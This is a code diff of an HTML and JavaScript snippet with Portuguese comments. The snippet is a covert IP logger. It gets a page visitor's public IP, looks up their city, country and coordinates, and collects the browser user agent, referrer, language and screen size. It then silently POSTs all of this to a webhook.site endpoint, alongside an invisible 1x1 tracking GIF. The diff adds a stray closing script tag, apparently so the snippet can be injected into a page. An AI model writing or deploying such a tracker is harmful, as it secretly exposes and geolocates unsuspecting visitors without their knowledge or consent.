@@ -1,24 +1,28 @@
+</script>
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="">
 <script>
 fetch("https://api.ipify.org?format=json")
   .then(r=>r.json())
   .then(data=>{
-    fetch(`https://ipapi.co/${data.ip}/json/`)  // Adicione esta linha para lat/lng
+    fetch(`https://ip-api.com/json/${data.ip}?fields=status,message,country,city,lat,lon,query`)
       .then(r=>r.json())
       .then(geo=>{
+        if(geo.status !== 'success') return;  // Evita erros
         const hit = {
           ip: data.ip,
-          lat: geo.latitude,  // Coordenadas aproximadas
-          lng: geo.longitude,
+          lat: geo.lat,
+          lon: geo.lon,
+          city: geo.city,
+          country: geo.country,
           hora: new Date().toLocaleString("pt-BR",{timeZone:"America/Sao_Paulo"}),
           ua: navigator.userAgent,
           ref: document.referrer,
           lang: navigator.language,
           sw: screen.width,
-          sh: screen.height,
-          city: geo.city
+          sh: screen.height
         };
         fetch("https://webhook.site/5ca87817-0e0b-4a00-9dad-19840499be75",{method:"POST",body:JSON.stringify(hit),headers:{"Content-Type":"application/json"}});
-      });
-  });
+      }).catch(e=>console.log('Geo fail:',e));  // Log erro
+  }).catch(e=>console.log('IP fail:',e));
 </script>
 <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="">
